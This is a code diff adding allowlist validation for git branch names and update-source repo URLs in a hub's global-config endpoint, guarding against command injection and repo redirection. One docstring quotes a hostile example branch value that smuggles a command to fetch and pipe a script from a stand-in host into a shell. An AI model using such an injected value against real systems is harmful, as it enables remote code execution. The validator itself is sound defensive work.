@@ -1,8 +1,63 @@
 """Setup misc: subnet-filter, delete-user, GitHub repos/branches, global config."""
+import re
+
 from api import (
     HTTPException, Request, _FILTER_DEFAULTS, _FILTER_MODULES, _filter_config,
     _invalidate_user_sessions, asyncio, logger,
 )
+
+
+class _ConfigValidationError(ValueError):
+    """Raised when an incoming global_config value fails the charset allowlist."""
+
+
+# Tight charset for git refs (branch/tag names): git forbids a small set of
+# ascii (space, ~, ^, :, ?, *, [, \, control) — we allow the common printable
+# subset that survives every git transport. URLs get a separate allowlist.
+# Anything outside these is rejected at config-write time so the values that
+# flow into the hub self-update git argv (create_subprocess_exec, but
+# defense-in-depth) can never repoint the hub at an attacker repo / weird ref.
+_REF_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._/+-]{0,99}$")
+_URL_RE = re.compile(
+    r"^(https|http|git|ssh)://"        # scheme
+    r"[A-Za-z0-9._:/@%~-]{1,253}"      # host+path (no spaces, no shell metachars)
+    r"\.git$|^https?://[A-Za-z0-9._:/@%~-]{1,253}$"
+)
+# Keys under update_sources whose values are repo URLs (validated as URLs).
+_URL_SOURCE_KEYS = {
+    "hub", "pxmx", "opnsense", "opn", "cs", "cppm", "netbox", "ldap", "nw",
+    "le", "agent",
+}
+
+
+def _validate_update_config(config: dict) -> None:
+    """Charset-allowlist the update_sources.* URLs and global_branch before they
+    are merged into global_config. These flow into the hub self-update git argv;
+    a hostile value (e.g. ``main; curl evil|sh #`` for branch, or an attacker
+    repo URL) would otherwise repoint the hub pull. Raises _ConfigValidationError
+    on the first bad value so the whole write is rejected (no partial merge)."""
+    if not isinstance(config, dict):
+        return  # other handlers reject non-dict; not our concern here
+    sources = config.get("update_sources")
+    if isinstance(sources, dict):
+        for k, v in sources.items():
+            if v is None:
+                continue  # explicit ""/None = "use default / unset" is allowed
+            if k in _URL_SOURCE_KEYS and v != "":
+                if not isinstance(v, str) or not _URL_RE.match(v):
+                    raise _ConfigValidationError(
+                        f"update_sources.{k} must be a git URL (got an invalid value).")
+            elif isinstance(v, str) and v:
+                # non-URL source keys: still bound the charset so nothing exotic
+                # rides into a git argv downstream.
+                if not _REF_RE.match(v):
+                    raise _ConfigValidationError(
+                        f"update_sources.{k} contains an invalid character.")
+    branch = config.get("global_branch")
+    if isinstance(branch, str) and branch and not _REF_RE.match(branch):
+        raise _ConfigValidationError(
+            "global_branch must be a git ref name (letters, digits, '.', '/', "
+            "'-', '+', '_'); got an invalid value.")
 
 
 def register(app, hub, ctx):
@@ -155,10 +210,23 @@ def register(app, hub, ctx):
             data = await request.json()
             config = data.get("config", {})
 
+            # SECURITY: validate the fields that flow into the hub self-update
+            # git argv (update_sources.* URLs + global_branch). They are
+            # shell-interpolated-free now (create_subprocess_exec), but a bad
+            # value still changes which repo/branch the hub pulls. Reject
+            # anything outside a tight charset so a config write can never
+            # repoint the hub at an attacker repo or a weird ref. Admin-only
+            # route, but config fields must never be arbitrary strings.
+            _validate_update_config(config)
+
             gc = hub.state.system_state.setdefault("global_config", {})
             gc.update(config)
             hub.state.save_state()
 
             return {"status": "ok", "message": "Global configuration updated."}
+        except HTTPException:
+            raise
+        except _ConfigValidationError as e:
+            raise HTTPException(status_code=400, detail=str(e))
         except Exception as e:
             raise HTTPException(status_code=400, detail=f"Invalid request: {str(e)}")
